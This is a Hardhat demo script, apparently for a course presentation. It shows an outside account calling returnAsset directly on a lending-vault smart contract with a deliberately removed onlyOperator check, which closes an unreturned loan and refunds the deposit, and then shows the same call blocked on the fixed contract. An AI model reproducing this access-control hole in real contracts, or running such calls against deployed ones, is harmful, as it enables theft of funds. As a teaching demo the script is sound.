// Presentation demo of the injected security attack (improper access control).
//   npx hardhat run scripts/attack-demo.js
// Runs on Hardhat's in-memory network, so it never touches the real chain or database.
const { ethers } = require("hardhat");
const { time } = require("@nomicfoundation/hardhat-network-helpers");

const DAY = 24 * 60 * 60;
const OWNER = 1, BORROWER = 2, ASSET = 1, LOAN = 1, DEPOSIT = 1000;
const STATUS = ["None", "Registered", "Verified (available)", "Borrowed"];

async function snapshot(vault) {
  const loan = await vault.loans(LOAN);
  const asset = await vault.assets(ASSET);
  return {
    "loan open": loan.open,
    "asset status": STATUS[Number(asset.status)],
    "borrower tokens": Number(await vault.balances(BORROWER)),
    "owner tokens": Number(await vault.balances(OWNER)),
  };
}

async function run(contractName) {
  const [operator, attacker] = await ethers.getSigners();
  const vault = await ethers.deployContract(contractName, operator);
  await vault.registerAsset(ASSET, OWNER, ethers.ZeroHash);
  await vault.verifyAsset(ASSET);
  await vault.grantTokens(BORROWER, 5000);
  await vault.borrow(LOAN, ASSET, BORROWER, DEPOSIT, (await time.latest()) + 3 * DAY);

  console.log(`\n=== ${contractName} ===`);
  console.log(`operator: ${operator.address}`);
  console.log(`attacker: ${attacker.address} (not the operator)`);
  const before = await snapshot(vault);

  let outcome;
  try {
    // The borrower (or anyone) calls the contract directly, bypassing the app and the owner.
    const tx = await vault.connect(attacker).returnAsset(LOAN, false);
    const r = await tx.wait();
    outcome = `ATTACK SUCCEEDED in block ${r.blockNumber} (gas ${r.gasUsed})`;
  } catch (e) {
    outcome = `ATTACK BLOCKED: ${e.shortMessage || e.message}`;
  }
  const after = await snapshot(vault);

  console.table(Object.keys(before).map((k) => ({ field: k, before: before[k], after: after[k] })));
  console.log(outcome);
}

async function main() {
  console.log("Attack: an outside account calls returnAsset(loanId, false) directly on the contract,");
  console.log("closing a loan whose item was never returned and refunding the borrower's deposit.");
  await run("CampusVaultVulnerable"); // injected flaw: no onlyOperator on returnAsset
  await run("CampusVault"); // real contract: onlyOperator restored
}

main().catch((e) => {
  console.error(e);
  process.exitCode = 1;
});
